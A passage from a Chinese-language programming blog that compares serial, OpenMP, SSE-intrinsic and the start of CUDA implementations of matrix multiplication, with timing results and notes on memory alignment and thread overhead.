            <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">k</span><span class="p">){</span>
                <span class="n">temp</span> <span class="o">+=</span> <span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">*</span> <span class="n">B</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span><span class="p">];</span>
            <span class="p">}</span>
            <span class="n">MPMul</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">temp</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="kt">float</span><span class="o">**</span> <span class="nf">randMatrix</span><span class="p">(){</span>
    <span class="n">srand</span><span class="p">(</span><span class="n">static_cast</span><span class="o">&lt;</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="o">&gt;</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="n">nullptr</span><span class="p">)));</span>
    <span class="kt">float</span> <span class="o">**</span><span class="n">Matrix</span> <span class="o">=</span> <span class="p">(</span><span class="kt">float</span><span class="o">**</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">N</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">float</span><span class="o">*</span><span class="p">));</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="n">Matrix</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">float</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">float</span><span class="p">)</span> <span class="o">*</span> <span class="n">N</span><span class="p">);</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">){</span>
            <span class="n">Matrix</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">static_cast</span><span class="o">&lt;</span><span class="kt">float</span><span class="o">&gt;</span><span class="p">(</span><span class="n">rand</span><span class="p">())</span> <span class="o">/</span> <span class="n">static_cast</span><span class="o">&lt;</span><span class="kt">float</span><span class="o">&gt;</span><span class="p">(</span><span class="n">RAND_MAX</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">Matrix</span><span class="p">;</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>

    <span class="kt">float</span> <span class="o">**</span><span class="n">A</span> <span class="o">=</span> <span class="n">randMatrix</span><span class="p">();</span>
    <span class="kt">float</span> <span class="o">**</span><span class="n">B</span> <span class="o">=</span> <span class="n">randMatrix</span><span class="p">();</span>
    <span class="c1">// 分别计算并计时</span>
    <span class="kt">clock_t</span> <span class="n">normal_beg</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>
    <span class="n">MulNormal</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="n">B</span><span class="p">);</span>
    <span class="kt">clock_t</span> <span class="n">normal_end</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>

    <span class="kt">clock_t</span> <span class="n">MP_beg</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>
    <span class="n">MulMP</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="n">B</span><span class="p">);</span>
    <span class="kt">clock_t</span> <span class="n">MP_end</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>
    <span class="c1">// 输出</span>
    <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">"normal: "</span><span class="o">&lt;&lt;</span><span class="n">normal_end</span> <span class="o">-</span> <span class="n">normal_beg</span><span class="o">&lt;&lt;</span><span class="s">" ms"</span><span class="o">&lt;&lt;</span><span class="sc">'\n'</span><span class="p">;</span>
    <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">"MP:     "</span><span class="o">&lt;&lt;</span><span class="n">MP_end</span> <span class="o">-</span> <span class="n">MP_beg</span><span class="o">&lt;&lt;</span><span class="s">" ms"</span><span class="o">&lt;&lt;</span><span class="sc">'\n'</span><span class="p">;</span>
    <span class="n">check</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="输出结果以及对比">   输出结果以及对比</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>normal: 1097 ms
MP:     454 ms
13.9073 16.8046 14.3195 17.28 13.1921 15.0843 15.269 16.6484 15.771 15.2247 14.5149 13.783 12.2384 14.3623 15.2282 15.4888 
13.9073 16.8046 14.3195 17.28 13.1921 15.0843 15.269 16.6484 15.771 15.2247 14.5149 13.783 12.2384 14.3623 15.2282 15.4888
</code></pre></div></div> <h5 id="示例中使用了简单的pragma预处理指令并行最外层的循环设置线程为4在矩阵大小为6464是取得了较好的效果然而如果进一步增大矩阵大小可能出现cache命中率下降线程之间错误共享综合时间反而不如串行的现象此时需要手动对线程进一步细化管理例如schedulemode-size-critical等预处理指令其次如果增加线程数量num_threads会导致维护线程的开支增大以及线程之间的资源竞争所以需要对线程数量进行权衡">   示例中使用了简单的<code class="language-plaintext highlighter-rouge">#pragma</code>预处理指令并行最外层的循环，设置线程为4，在矩阵大小为64*64是取得了较好的效果<br/>   然而，如果进一步增大矩阵大小，可能出现cache命中率下降，线程之间’错误共享’，综合时间反而不如串行的现象。此时，需要手动对线程进一步细化管理，例如<code class="language-plaintext highlighter-rouge">schedule(mode, size), critical</code>等预处理指令<br/>   其次，如果增加线程数量(num_threads)，会导致维护线程的开支增大，以及线程之间的资源竞争，所以需要对线程数量进行权衡.</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># thread_num = 16;</span>
normal: 805 ms
MP:     194067 ms
17.8174 17.7196 16.8649 16.4366 19.456 16.0795 17.8538 17.5493 17.6787 16.7344 15.528 15.5007 12.8625 17.4086 17.7185 16.5289 
17.8174 17.7196 16.8649 16.4366 19.456 16.0795 17.8538 17.5493 17.6787 16.7344 15.528 15.5007 12.8625 17.4086 17.7185 16.5289
</code></pre></div></div> <h3 id="数据级别并行">数据级别并行</h3> <h5 id="数据级并行是一种显式并行技术主要通过单指令多数据single-instruction-multiple-data-simd的方式实现在simd模型中一条指令可以同时对多个数据进行相同的操作这种并行性特别适用于处理大量相同类型的数据集如图像处理音频处理科学计算中的向量和矩阵运算等在x86汇编中有很多的拓展指令集能够实现simd-例如mmxsseavx-这些指令集通过将单一数据组合并放入拓展的寄存器中如xmm系列寄存器配合专用的拓展指令完成数据级别的并行和快速计算以浮点数的加法为例使用sse拓展指令拓展指令可以使用gccg自带的库进行连接也可以在代码中直接插入内联汇编指令下面的示例代码采用前者的方法">   数据级并行是一种显式并行技术，主要通过单指令多数据（Single Instruction, Multiple Data, SIMD）的方式实现。在SIMD模型中，一条指令可以同时对多个数据进行相同的操作。这种并行性特别适用于处理大量相同类型的数据集，如图像处理、音频处理、科学计算中的向量和矩阵运算等<br/>   在X86汇编中，有很多的拓展指令集能够实现SIMD, 例如MMX、SSE、AVX, 这些指令集通过将单一数据组合并放入拓展的寄存器中(如xmm系列寄存器)，配合专用的拓展指令，完成数据级别的并行和快速计算。<br/>   以浮点数的加法为例，使用SSE拓展指令。拓展指令可以使用gcc/g++自带的库进行连接，也可以在代码中直接插入内联汇编指令，下面的示例代码采用前者的方法.</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;pmmintrin.h&gt;</span><span class="c1"> </span><span class="cp">
#include</span> <span class="cpf">&lt;ctime&gt;</span><span class="cp">
</span>
<span class="k">const</span> <span class="kt">int</span> <span class="n">N</span> <span class="o">=</span> <span class="mi">64</span><span class="p">;</span>

<span class="kt">float</span> <span class="n">NormalMul</span><span class="p">[</span><span class="n">N</span><span class="p">][</span><span class="n">N</span><span class="p">];</span>
<span class="kt">float</span> <span class="n">SSEMul</span><span class="p">[</span><span class="n">N</span><span class="p">][</span><span class="n">N</span><span class="p">];</span>

<span class="kt">void</span> <span class="nf">check</span><span class="p">(){</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span><span class="n">NormalMul</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">i</span><span class="p">]</span><span class="o">&lt;&lt;</span><span class="sc">' '</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span><span class="n">SSEMul</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">i</span><span class="p">]</span><span class="o">&lt;&lt;</span><span class="sc">' '</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>

<span class="p">}</span>
<span class="c1">// 矩阵数据随即处理</span>
<span class="kt">float</span><span class="o">**</span> <span class="nf">randMatrix</span><span class="p">(){</span>
    <span class="n">srand</span><span class="p">(</span><span class="n">static_cast</span><span class="o">&lt;</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="o">&gt;</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="n">nullptr</span><span class="p">)));</span>
    <span class="kt">float</span> <span class="o">**</span><span class="n">Matrix</span> <span class="o">=</span> <span class="p">(</span><span class="kt">float</span><span class="o">**</span><span class="p">)</span><span class="n">_mm_malloc</span><span class="p">(</span><span class="n">N</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">float</span><span class="o">*</span><span class="p">),</span> <span class="mi">16</span><span class="p">);</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="n">Matrix</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">float</span><span class="o">*</span><span class="p">)</span><span class="n">_mm_malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">float</span><span class="p">)</span> <span class="o">*</span> <span class="n">N</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">){</span>
            <span class="n">Matrix</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">static_cast</span><span class="o">&lt;</span><span class="kt">float</span><span class="o">&gt;</span><span class="p">(</span><span class="n">rand</span><span class="p">())</span> <span class="o">/</span> <span class="n">static_cast</span><span class="o">&lt;</span><span class="kt">float</span><span class="o">&gt;</span><span class="p">(</span><span class="n">RAND_MAX</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">Matrix</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">MulNormal</span><span class="p">(</span><span class="kt">float</span> <span class="o">**</span><span class="n">A</span><span class="p">,</span> <span class="kt">float</span> <span class="o">**</span><span class="n">B</span><span class="p">){</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">){</span>
            <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">k</span><span class="p">){</span>
                <span class="n">NormalMul</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">+=</span> <span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">*</span> <span class="n">B</span><span class="p">[</span><span class="n">j</span><span class="p">][</span><span class="n">k</span><span class="p">];</span> <span class="c1">// &lt;---- 计算方式与SSE方法保持一致</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">MulSSE</span><span class="p">(</span><span class="kt">float</span> <span class="o">**</span><span class="n">A</span><span class="p">,</span> <span class="kt">float</span> <span class="o">**</span><span class="n">B</span><span class="p">){</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">){</span>
            <span class="n">__m128</span> <span class="n">temp</span> <span class="o">=</span> <span class="n">_mm_setzero_ps</span><span class="p">();</span> <span class="c1">// 初始化一个空的xmm寄存器</span>
            <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="n">k</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">){</span>
                <span class="n">temp</span> <span class="o">=</span> <span class="n">_mm_add_ps</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span> 
                <span class="n">_mm_mul_ps</span><span class="p">(</span><span class="n">_mm_load_ps</span><span class="p">(</span><span class="o">&amp;</span><span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">k</span><span class="p">]),</span> 
                <span class="n">_mm_load_ps</span><span class="p">(</span><span class="o">&amp;</span><span class="n">B</span><span class="p">[</span><span class="n">j</span><span class="p">][</span><span class="n">k</span><span class="p">])));</span>
            <span class="p">}</span>
            <span class="n">temp</span> <span class="o">=</span> <span class="n">_mm_hadd_ps</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span> <span class="n">temp</span><span class="p">);</span>
            <span class="n">temp</span> <span class="o">=</span> <span class="n">_mm_hadd_ps</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span> <span class="n">temp</span><span class="p">);</span>
            <span class="n">_mm_store_ss</span><span class="p">(</span><span class="o">&amp;</span><span class="n">SSEMul</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">],</span> <span class="n">temp</span><span class="p">);</span> <span class="c1">// 两次水平加法，获取一个xmm寄存器中的4个float数据的加和</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="kt">float</span> <span class="o">**</span><span class="n">A</span> <span class="o">=</span> <span class="n">randMatrix</span><span class="p">();</span>
    <span class="kt">float</span> <span class="o">**</span><span class="n">B</span> <span class="o">=</span> <span class="n">randMatrix</span><span class="p">();</span>
    
    <span class="kt">clock_t</span> <span class="n">normal_beg</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>
    <span class="n">MulNormal</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="n">B</span><span class="p">);</span>
    <span class="kt">clock_t</span> <span class="n">normal_end</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>

    <span class="kt">clock_t</span> <span class="n">SSE_beg</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>
    <span class="n">MulSSE</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="n">B</span><span class="p">);</span>
    <span class="kt">clock_t</span> <span class="n">SSE_end</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>

    <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">"normal: "</span><span class="o">&lt;&lt;</span><span class="n">normal_end</span> <span class="o">-</span> <span class="n">normal_beg</span><span class="o">&lt;&lt;</span><span class="s">" ms"</span><span class="o">&lt;&lt;</span><span class="sc">'\n'</span><span class="p">;</span>
    <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">"SSE:    "</span><span class="o">&lt;&lt;</span><span class="n">SSE_end</span> <span class="o">-</span> <span class="n">SSE_beg</span><span class="o">&lt;&lt;</span><span class="s">" ms"</span><span class="o">&lt;&lt;</span><span class="sc">'\n'</span><span class="p">;</span>
    <span class="n">check</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="c1">// g++ -msse3 SSE.cpp -o SSE</span>
</code></pre></div></div> <h5 id="结果输出">   结果输出</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># const int N = 64;</span>
normal: 1113 ms
SSE:    373 ms
22.9132 14.8315 16.3082 15.3699 18.9539 17.6561 20.4305 17.9889 15.3361 15.531 15.0805 18.0234 16.0815 15.5114 15.6305 18.4012 
22.9132 14.8315 16.3082 15.3699 18.9539 17.6561 20.4305 17.9889 15.3361 15.531 15.0805 18.0234 16.0815 15.5114 15.6305 18.4012 
</code></pre></div></div> <h5 id="使用sse指令有许多细节需要考虑这是由于_mm_add_ps等接口并非函数而是打包的汇编指令使用时有诸多限制">   使用SSE指令有许多细节需要考虑，这是由于<code class="language-plaintext highlighter-rouge">_mm_add_ps</code>等接口，并非函数而是打包的汇编指令，使用时有诸多限制<br/></h5> <h5 id="编译过程中不存在类型检查和对齐检查所以在编写中需要手动确认变量内存的大小和对齐以避免出现由于不当地使用汇编指令造成的内存溢出甚至是段错误下面是源代码的二进制文件中的一段截取对应的是_mm_setzero_ps的工作">   编译过程中不存在类型检查和对齐检查，所以在编写中需要手动确认变量内存的大小和对齐，以避免出现由于不当地使用汇编指令造成的内存溢出甚至是段错误。<br/>   下面是源代码的二进制文件中的一段截取，对应的是<code class="language-plaintext highlighter-rouge">_mm_setzero_ps</code>的工作。</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:0000000000001231                 mov     rax, <span class="o">[</span>rbp+var_68]
.text:0000000000001235                 movups  xmm0, xmmword ptr <span class="o">[</span>rax]
.text:0000000000001238                 movaps  <span class="o">[</span>rbp+var_60], xmm0
.text:000000000000123C                 mov     eax, <span class="o">[</span>rbp+var_7C]
</code></pre></div></div> <h5 id="其次sse指令中的movups和movaps要求的是连续的一块16bit内存所以需要对矩阵运算做一些改造考虑如下代码是cpu串行计算时最内层的计算方式注意其中的bkj在依次遍历k的过程中bkjbk1jbk2j的内存不连续-无法通过指令直接加载进入xmm寄存器">   其次，SSE指令中的<code class="language-plaintext highlighter-rouge">movups和movaps</code>要求的是连续的一块16bit内存，所以，需要对矩阵运算做一些改造<br/>   考虑如下代码，是cpu串行计算时，最内层的计算方式。注意其中的<code class="language-plaintext highlighter-rouge">B[k][j]</code>，在依次遍历<code class="language-plaintext highlighter-rouge">k</code>的过程中，<code class="language-plaintext highlighter-rouge">B[k][j]、B[k+1][j]、B[k+2][j]</code>的内存不连续, 无法通过指令直接加载进入xmm寄存器</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">k</span><span class="p">){</span>
    <span class="n">NormalMul</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">+=</span> <span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">*</span> <span class="n">B</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span><span class="p">];</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="将矩阵b从-行x列-的格式转化为-列x行-的格式如下">   将矩阵B从 行x列 的格式，转化为 列x行 的格式，如下</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">k</span><span class="p">){</span>
    <span class="n">NormalMul</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">+=</span> <span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">*</span> <span class="n">B</span><span class="p">[</span><span class="n">j</span><span class="p">][</span><span class="n">k</span><span class="p">];</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="此时遍历过程中两个操作数就都是连续的内存">   此时，遍历过程中两个操作数就都是连续的内存</h5> <h3 id="gpu并行计算">GPU并行计算</h3> <h5 id="gpu拥有大量的计算核心擅长于计算与图形相关的各种矩阵运算大规模数据的简单处理当单机的运算资源不足是可以将部分运算分配给gpu-利用gpu进行并行运算以nvidia的独显为例使用配套的cuda工具链中的nvcc编译器编写一个2维矩阵的乘法运算源代码中使用__host__和__device__关键字来区分分配给cpu或者是gpu的工作对于gpu的函数还需提前设置网格grid和线程块block">   GPU拥有大量的计算核心，擅长于计算与图形相关的各种矩阵运算(大规模数据的简单处理)。当单机的运算资源不足是，可以将部分运算分配给GPU, 利用GPU进行并行运算.<br/>   以Nvidia的独显为例，使用配套的CUDA工具链中的nvcc编译器，编写一个2维矩阵的乘法运算<br/>   源代码中，使用<code class="language-plaintext highlighter-rouge">__host__</code>和<code class="language-plaintext highlighter-rouge">__device__</code>关键字来区分分配给CPU或者是GPU的工作，对于GPU的函数，还需提前设置网格(grid)和线程块(block)<br/></h5> <h5 id="很久之前的写的代码拿出来水一下">   很久之前的写的代码拿出来水一下</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">"utils.cuh"</span><span class="cp">
#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;ctime&gt;</span><span class="cp">
</span><span class="n">using</span> <span class="n">namespace</span> <span class="n">std</span><span class="p">;</span>

<span class="k">const</span> <span class="kt">int</span> <span class="n">N</span> <span class="o">=</span> <span class="mi">1024</span><span class="p">;</span>
<span class="kt">float</span> <span class="n">Matrix_CPU_A</span><span class="p">[</span><span class="n">N</span><span class="p">][</span><span class="n">N</span><span class="p">],</span> <span class="n">Matrix_CPU_B</span><span class="p">[</span><span class="n">N</span><span class="p">][</span><span class="n">N</span><span class="p">],</span> <span class="n">Matrix_CPU_C</span><span class="p">[</span><span class="n">N</span><span class="p">][</span><span class="n">N</span><span class="p">];</span>
<span class="kt">float</span> <span class="o">**</span><span class="n">Matrix_GPU_A</span><span class="p">,</span><span class="o">**</span><span class="n">Matrix_GPU_B</span><span class="p">,</span><span class="o">**</span><span class="n">Matrix_GPU_C</span><span class="p">;</span>

<span class="n">__host__</span> <span class="kt">void</span> <span class="nf">randomMatrix</span><span class="p">(</span><span class="kt">float</span> <span class="n">matrix</span><span class="p">[</span><span class="n">N</span><span class="p">][</span><span class="n">N</span><span class="p">]){</span>
    <span class="n">srand</span><span class="p">(</span><span class="n">static_cast</span><span class="o">&lt;</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="o">&gt;</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="n">nullptr</span><span class="p">)));</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">){</span>
            <span class="n">matrix</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">static_cast</span><span class="o">&lt;</span><span class="kt">float</span><span class="o">&gt;</span><span class="p">(</span><span class="n">rand</span><span class="p">())</span> <span class="o">/</span> <span class="n">static_cast</span><span class="o">&lt;</span><span class="kt">float</span><span class="o">&gt;</span><span class="p">(</span><span class="n">RAND_MAX</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">__host__</span> <span class="kt">void</span> <span class="nf">CPUMul</span><span class="p">(){</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">){</span>
            <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">k</span><span class="p">){</span>
                <span class="n">Matrix_CPU_C</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">+=</span> <span class="n">Matrix_CPU_A</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">*</span> <span class="n">Matrix_CPU_B</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span><span class="p">];</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="n">__host__</span> <span class="kt">void</span> <span class="nf">check</span><span class="p">(</span><span class="kt">float</span> <span class="n">matrix</span><span class="p">[</span><span class="n">N</span><span class="p">][</span><span class="n">N</span><span class="p">]){</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
